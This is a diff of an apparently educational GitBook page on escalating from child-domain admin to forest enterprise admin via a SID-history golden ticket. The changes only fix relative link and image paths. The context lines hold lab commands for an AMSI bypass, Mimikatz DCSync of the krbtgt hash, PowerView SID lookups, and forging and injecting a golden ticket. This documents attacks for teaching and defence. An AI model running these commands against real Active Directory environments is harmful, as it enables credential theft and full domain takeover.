@@ -15,14 +15,14 @@ Once you gain Domain Admin privileges within the child domain its possible to ge
 
 The attack is executed from the perspective of already gaining domain admin privileges. This is done in the unconstrained delegation section:
 
-{% content-ref url="../../delegation-attacks/unconstrained-delegation/" %}
-[unconstrained-delegation](../../delegation-attacks/unconstrained-delegation/)
+{% content-ref url="../delegation-attacks/unconstrained-delegation/" %}
+[unconstrained-delegation](../delegation-attacks/unconstrained-delegation/)
 {% endcontent-ref %}
 
 1. For easy execution, login on `WS01` as the `Administrator` user with the password `Welcome01!`.
 2. Start PowerShell as Administrator and load a amsi bypass and MimiKatz into memory.
 
-![](<../../../../.gitbook/assets/image (20).png>)
+![](<../../../.gitbook/assets/image (20).png>)
 
 To execute the attack we need a couple bits of information:
 
@@ -36,7 +36,7 @@ To execute the attack we need a couple bits of information:
 Invoke-MimiKatz -Command '"lsadump::dcsync /user:amsterdam\krbtgt /domain:amsterdam.bank.local"'
 ```
 
-![](<../../../../.gitbook/assets/image (22) (1).png>)
+![](<../../../.gitbook/assets/image (22) (1).png>)
 
 4\. Retrieve the SID of the enterprise Admins group, using PowerView:
 
@@ -44,7 +44,7 @@ Invoke-MimiKatz -Command '"lsadump::dcsync /user:amsterdam\krbtgt /domain:amster
 Get-DomainGroup "Enterprise Admins" -Domain bank.local | Select-Object samaccountname, objectsid
 ```
 
-![](<../../../../.gitbook/assets/image (34).png>)
+![](<../../../.gitbook/assets/image (34).png>)
 
 5\. Retrieve the domain SID from the child domain, using PowerView:
 
@@ -52,7 +52,7 @@ Get-DomainGroup "Enterprise Admins" -Domain bank.local | Select-Object samaccoun
 Get-DomainSID
 ```
 
-![](<../../../../.gitbook/assets/image (21).png>)
+![](<../../../.gitbook/assets/image (21).png>)
 
 6\. Create a golden ticket with MimiKatz and inject it into the current session:
 
@@ -60,11 +60,11 @@ Get-DomainSID
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<CHILD DOMAIN SID> /krbtgt:<HASH> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /ptt"'
 ```
 
-![](<../../../../.gitbook/assets/image (70).png>)
+![](<../../../.gitbook/assets/image (70).png>)
 
 7\. The ticket injected successfully, now we can dir the c$ directory to check if our user has read/write access to the C disk:
 
-![](<../../../../.gitbook/assets/image (75).png>)
+![](<../../../.gitbook/assets/image (75).png>)
 
 ## Defending
 
